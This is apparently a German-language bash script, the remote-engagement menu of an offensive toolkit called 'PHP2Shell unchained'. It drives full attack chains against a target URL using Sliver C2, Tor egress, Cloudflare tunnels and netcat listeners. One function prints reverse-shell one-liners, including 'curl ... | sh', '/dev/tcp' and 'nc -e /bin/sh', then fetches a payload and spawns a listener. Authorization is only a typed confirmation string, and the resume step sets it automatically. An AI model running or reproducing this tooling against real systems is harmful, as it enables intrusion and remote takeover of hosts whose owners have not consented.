#!/usr/bin/env bash
# Remote-Engagement Submenü — Wizard + Scope-Verwaltung + Session-Steuerung.
# Wird aus dem Hauptmenü (Taste [e]) aufgerufen; kann auch direkt laufen.
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
export LAB_ROOT="$ROOT"
# shellcheck source=scripts/docker-env.sh
source "$ROOT/scripts/docker-env.sh"
source "$ROOT/remote/lib/scope.sh"
source "$ROOT/remote/lib/term.sh"
source "$ROOT/remote/lib/state.sh"
ORCH="$ROOT/remote/orchestrate.sh"

hdr() {
  clear 2>/dev/null || true
  cat <<'BANNER'
  ┌──────────────────────────────────────────────────────────────┐
  │   PHP2Shell unchained — REMOTE ENGAGEMENT (Produktiv, RoE)   │
  └──────────────────────────────────────────────────────────────┘
BANNER
  local n=0
  [[ -f "$(scope_file)" ]] && n=$(grep -cv '^\s*\(#\|$\)' "$(scope_file)" || true)
  echo "  Scope-Einträge: $n · Terminal-Backend: $(term_backend) · CONFIRM_ROE: ${CONFIRM_ROE:-<nicht gesetzt>}"
  echo
}

pick_session() {
  local base="$ROOT/out/engage" i=1
  [[ ! -d "$base" ]] && { echo "Keine Sessions."; return 1; }
  local -a sids=()
  for d in "$base"/*/; do sids+=("$(basename "$d")"); done
  [[ ${#sids[@]} -eq 0 ]] && { echo "Keine Sessions."; return 1; }
  echo "  Sessions:"
  for s in "${sids[@]}"; do printf "    [%d] %s\n" "$i" "$s"; i=$((i+1)); done
  read -r -p "  Auswahl [1]: " c
  c="${c:-1}"
  [[ "$c" =~ ^[0-9]+$ ]] && (( c >= 1 && c <= ${#sids[@]} )) || return 1
  printf '%s' "${sids[$((c-1))]}"
}

cmd_scope() {
  hdr
  echo "  ── Scope (RoE-Nachweis: $(scope_file)) ──"
  echo
  if [[ -f "$(scope_file)" ]]; then cat -n "$(scope_file)"; else echo "  (leer — Datei existiert noch nicht)"; fi
  echo
  echo "  [a] Host/CIDR hinzufügen    [ENTER] zurück"
  read -r -p "  Auswahl: " c
  if [[ "$c" == "a" ]]; then
    read -r -p "  Host/CIDR: " h
    read -r -p "  RoE-Referenz (Ticket/Datum): " r
    [[ -n "$h" ]] && printf '%s  # RoE %s\n' "$h" "${r:-ohne Referenz}" >> "$(scope_file)"
    echo "  → eingetragen."
    sleep 1
  fi
}

cmd_run_wizard() {
  hdr
  echo "  ── Neues Engagement (Vollkette) ──"
  echo
  read -r -p "  Ziel-URL (z.B. https://staging.example/index.php): " url
  [[ -z "$url" ]] && return 0
  local host; host="$(scope_url_host "$url")"
  if ! scope_host_in "$host"; then
    echo
    echo "  ⚠ '$host' steht NICHT in scope-authorized.txt."
    read -r -p "  Jetzt eintragen? (RoE-Referenz oder leer=Abbruch): " r
    [[ -z "$r" ]] && { echo "  Abgebrochen."; sleep 1; return 0; }
    printf '%s  # RoE %s\n' "$host" "$r" >> "$(scope_file)"
  fi
  local lhost_def; lhost_def="$(ip -4 route get 1.1.1.1 2>/dev/null | grep -oP 'src \K[0-9.]+' || echo '')"
  read -r -p "  Listener-IP (LHOST) [${lhost_def}]: " lhost; lhost="${lhost:-$lhost_def}"
  read -r -p "  Listener-Port [4444]: " lport; lport="${lport:-4444}"
  read -r -p "  Tor-Egress (Host :9050) für Recon/Audit? [j/N]: " tor
  read -r -p "  Sliver C2 (compose/host auto)? [J/n]: " c2
  read -r -p "  Reverse-Shell-as-a-Service (lukechilds)? [J/n]: " rs
  read -r -p "  Cloudflare Tunnel (Listener + Sliver HTTPS)? [j/N]: " tun
  read -r -p "  Lab-External (Tor+Tunnel web/sliver, nur Lab-IP)? [J/n]: " ext
  read -r -p "  Jackalsyn selftest? [J/n]: " js
  echo "  Singularity: detect | lab (container) | full (build nur mit CONFIRM)"
  read -r -p "  Singularity-Modus [lab]: " sg
  sg="${sg:-lab}"
  echo
  echo "  ── Zusammenfassung ──"
  echo "  Ziel:         $url"
  echo "  LHOST:        $lhost:$lport"
  echo "  Tor:          $([[ "$tor" =~ ^[jJ] ]] && echo on || echo off)"
  echo "  Sliver C2:    $([[ "$c2" =~ ^[nN] ]] && echo none || echo sliver)"
  echo "  RAAS:         $([[ "$rs" =~ ^[nN] ]] && echo off || echo on)"
  echo "  Tunnel:       $([[ "$tun" =~ ^[jJ] ]] && echo on || echo off)"
  echo "  External:     $([[ "$ext" =~ ^[nN] ]] && echo auto || echo on)"
  echo "  Jackalsyn:    $([[ "$js" =~ ^[nN] ]] && echo off || echo auto)"
  echo "  Singularity:  ${sg:-lab}"
  echo "  Backend:      $(term_backend)"
  echo
  read -r -p "  START mit CONFIRM_ROE=I-AM-AUTHORIZED? Tippe ROE ein: " confirm
  [[ "$confirm" != "ROE" ]] && { echo "  Abgebrochen."; sleep 1; return 0; }

  export CONFIRM_ROE=I-AM-AUTHORIZED
  export ENGAGE_LHOST="$lhost" ENGAGE_LPORT="$lport" TARGET_URL="$url"
  export ENGAGE_C2=sliver ENGAGE_RS=on ENGAGE_JACKALSYN=auto ENGAGE_SINGULARITY="${sg:-lab}"
  export ENGAGE_FETCH_ALL=on ENGAGE_EXTERNAL=auto
  [[ "$tor" =~ ^[jJ] ]] && export ENGAGE_TOR=on
  [[ "$c2" =~ ^[nN] ]] && export ENGAGE_C2=none
  [[ "$rs" =~ ^[nN] ]] && export ENGAGE_RS=off
  [[ "$tun" =~ ^[jJ] ]] && export ENGAGE_TUNNEL=on
  [[ "$ext" =~ ^[nN] ]] && export ENGAGE_EXTERNAL=off
  [[ "$js" =~ ^[nN] ]] && export ENGAGE_JACKALSYN=off
  [[ "$sg" == "off" ]] && export ENGAGE_SINGULARITY=off
  if [[ "$sg" == "full" ]]; then
    read -r -p "  Singularity FULL braucht CONFIRM_SINGULARITY_ENGAGE=VM-REBOOT-OK — tippe VM-REBOOT-OK: " sconfirm
    [[ "$sconfirm" == "VM-REBOOT-OK" ]] && export CONFIRM_SINGULARITY_ENGAGE=VM-REBOOT-OK
  fi
  bash "$ORCH" run "$url"
  echo
  read -r -p "  ENTER für Menü… " _
}

cmd_resume() {
  hdr; local sid
  sid="$(pick_session)" || { sleep 1; return 0; }
  export CONFIRM_ROE="${CONFIRM_ROE:-I-AM-AUTHORIZED}"
  bash "$ORCH" resume "$sid"
  read -r -p "  ENTER für Menü… " _
}

cmd_status() { hdr; bash "$ORCH" status; echo; read -r -p "  ENTER für Menü… " _; }

cmd_listeners() {
  hdr; local sid
  sid="$(pick_session)" || { sleep 1; return 0; }
  bash "$ORCH" listeners "$sid"
  read -r -p "  ENTER für Menü… " _
}

cmd_report() {
  hdr; local sid
  sid="$(pick_session)" || { sleep 1; return 0; }
  local r="$ROOT/out/engage/$sid/REPORT.md"
  [[ -f "$r" ]] && ${PAGER:-less} "$r" || { echo "  Kein REPORT.md in $sid."; sleep 1; }
}

cmd_kits() {
  hdr
  bash "$ORCH" kits
  echo
  read -r -p "  ENTER für Menü… " _
}

cmd_rshell_variants() {
  hdr
  echo "  ── Reverse-Shell-as-a-Service (lukechilds) ──"
  echo
  if [[ ! -d "$ROOT/third_party/reverse-shell/.git" ]]; then
    echo "  Noch nicht gefetcht."
    read -r -p "  Jetzt fetch-reverse-shell ausführen? [J/n]: " f
    [[ ! "$f" =~ ^[nN] ]] && bash "$ROOT/scripts/fetch-reverse-shell.sh"
  fi
  local lh_def; lh_def="$(ip -4 route get 1.1.1.1 2>/dev/null | grep -oP 'src \K[0-9.]+' || echo '')"
  read -r -p "  LHOST [${lh_def}]: " lh; lh="${lh:-$lh_def}"
  read -r -p "  LPORT [4445]: " lp; lp="${lp:-4445}"
  echo
  echo "  RAAS:  curl -fsSL 'https://reverse-shell.sh/${lh}:${lp}' | sh"
  echo "  Repo:  https://github.com/lukechilds/reverse-shell"
  echo "  bash:  bash -i >& /dev/tcp/$lh/$lp 0>&1"
  echo "  nc:    nc $lh $lp -e /bin/sh"
  echo
  read -r -p "  Payload jetzt ziehen + Listener spawnen? [J/n]: " go
  if [[ ! "$go" =~ ^[nN] ]]; then
    mkdir -p "$ROOT/out/rshell"
    if curl -fsSL --max-time 20 "https://reverse-shell.sh/${lh}:${lp}" -o "$ROOT/out/rshell/r"; then
      chmod 755 "$ROOT/out/rshell/r"
      echo "  Payload: $ROOT/out/rshell/r ($(wc -c < "$ROOT/out/rshell/r") Bytes)"
    else
      echo "  Payload-Fetch fehlgeschlagen (Internet?)."
    fi
    term_spawn_jobs "p2s-rshell" "$ROOT/out/rshell" \
      "listener-$lp|nc -lvnp $lp"
    echo "  Listener läuft (Backend: $(term_backend))."
  fi
  read -r -p "  ENTER für Menü… " _
}

main_loop() {
  while true; do
    hdr
    cat <<'MENU'
    [1] Scope verwalten          scope-authorized.txt (RoE) anzeigen/eintragen
    [2] Engagement STARTEN       Wizard: URL · LHOST · Tor · Sliver · RAAS · Tunnel
    [3] Resume                   unterbrochene Session fortsetzen
    [4] Status                   alle Sessions + Phasen-Fortschritt
    [5] Listener neu spawnen     Fenster für bestehende Session erneut öffnen
    [6] Report ansehen           REPORT.md der Session
    [7] Reverse-Shell RAAS       lukechilds-Payload ziehen + Listener
    [8] Unterprojekte            Kits: vorhanden / fehlend (Sliver, Tor, RAAS, …)
    [0] Zurück

MENU
    read -r -p "  Auswahl: " c
    case "${c:-}" in
      1) cmd_scope ;;
      2) cmd_run_wizard ;;
      3) cmd_resume ;;
      4) cmd_status ;;
      5) cmd_listeners ;;
      6) cmd_report ;;
      7) cmd_rshell_variants ;;
      8) cmd_kits ;;
      0|q|"") return 0 ;;
    esac
  done
}

main_loop
